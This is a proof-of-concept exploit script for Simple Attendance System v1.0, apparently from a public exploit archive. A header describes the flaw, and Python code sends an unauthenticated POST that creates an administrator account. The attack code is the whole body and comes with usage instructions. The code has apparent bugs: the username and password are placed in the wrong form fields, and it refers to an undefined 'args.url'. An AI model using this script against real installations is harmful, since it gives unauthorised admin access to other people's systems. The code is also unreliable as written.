# Exploit Title: Simple Attendance System v1.0 - Unauthenticated Add Admin Account
# Exploit Author: Richard Jones
# Date: September 26, 2021
# Vendor Homepage: https://www.sourcecodester.com/php/14948/simple-attendance-system-php-and-sqlite-free-source-code.html
# Software Link: https://www.sourcecodester.com/download-code?nid=14948&title=Simple+Attendance+System+in+PHP+and+SQLite+Free+Source+Code
# Tested on: Kali Linux, Apache, Mysql
# Vendor:  oretnom23
# Version: v1.0
# Exploit Description:
#  Simple Attendance System v1.0  v1.0 suffers Unauthenticated Add Administration Account. We can craft a post request to add an admin account to the applicaiton without authentication.


# Usage: python3 attendance_poc.py -u admin1 -p admin1 -url http://localhost/attendance/
# Then login to the app at http://localhost/attendance/login.php to be logged as admin. 


import requests
import argparse


def createAccount(args):
    try:
        data = f'id=&fullname={args.username}&username={args.password}&type=1'
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        r = requests.post(url=f"{args.host}Actions.php?a=save_user", data=data, headers=headers)
        if r. status_code == 200:
            resp = r.text
            if "Username already exists." in resp:
                print(f"Username \"{args.username}\" taken!\nChange it and try again. ")        
            if "New User successfully saved." in resp:
                print("Created User")
                print(f"Username: {args.username}\nPassword: {args.password}")
                print(f"\nPlease try to login here: {args.url}login.php")        
    except:
        print("Unknown Error, Check URL and try again.")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--username", help="Username to create", required=True)
    parser.add_argument("-p", "--password", help="Password for the user account", required=True)
    parser.add_argument("-url", "--host", help="Host for the webapp eg: http://localhost/attendance/ << ends with / ", required=True)
    args = parser.parse_args()

    createAccount(args)



if __name__ == "__main__":
    main()
